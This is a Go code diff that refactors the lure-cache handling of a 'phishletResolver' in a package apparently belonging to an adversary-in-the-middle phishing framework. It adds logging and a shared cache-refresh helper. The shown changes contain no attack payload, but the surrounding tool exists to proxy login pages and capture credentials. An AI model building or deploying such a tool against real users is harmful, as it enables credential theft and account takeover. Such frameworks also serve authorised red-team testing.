@@ -2,6 +2,7 @@ package aitm
 
 import (
 	"fmt"
+	"log/slog"
 	"strings"
 	"sync"
 )
@@ -17,42 +18,41 @@ type phishletResolver struct {
 	lureStore lureStore
 	luresMu   sync.RWMutex
 	lures     []*Lure // cached; refreshed by InvalidateLures
+	logger    *slog.Logger
 }
 
-func newPhishletResolver(lureStore lureStore) *phishletResolver {
+func newPhishletResolver(lureStore lureStore, logger *slog.Logger) *phishletResolver {
 	return &phishletResolver{
 		phishlets: make(map[string]*Phishlet),
 		hostnames: make(map[string]*Phishlet),
 		lureStore: lureStore,
+		logger:    logger,
 	}
 }
 
-// LoadLuresFromDB populates the in-memory lure cache from the store.
+// loadLuresFromDB populates the in-memory lure cache from the store.
 // Call once at startup before serving requests.
 func (r *phishletResolver) loadLuresFromDB() error {
-	lures, err := r.lureStore.ListLures()
-	if err != nil {
-		return fmt.Errorf("loading lures: %w", err)
-	}
-
-	r.luresMu.Lock()
-	r.lures = lures
-	r.luresMu.Unlock()
-
-	return nil
+	return r.refreshLureCache()
 }
 
-// InvalidateLures reloads the lure cache from the store. Call after any lure mutation.
+// invalidateLures reloads the lure cache from the store. Call after any lure mutation.
 // On store error the stale cache is kept so in-flight requests are not disrupted.
 func (r *phishletResolver) invalidateLures() {
+	if err := r.refreshLureCache(); err != nil {
+		r.logger.Warn("lure cache invalidation failed, keeping stale cache", "error", err)
+	}
+}
+
+func (r *phishletResolver) refreshLureCache() error {
 	lures, err := r.lureStore.ListLures()
 	if err != nil {
-		return
+		return fmt.Errorf("refreshing lure cache: %w", err)
 	}
-
 	r.luresMu.Lock()
 	r.lures = lures
 	r.luresMu.Unlock()
+	return nil
 }
 
 // Register stores p in both indexes. If p is enabled and has a non-empty hostname
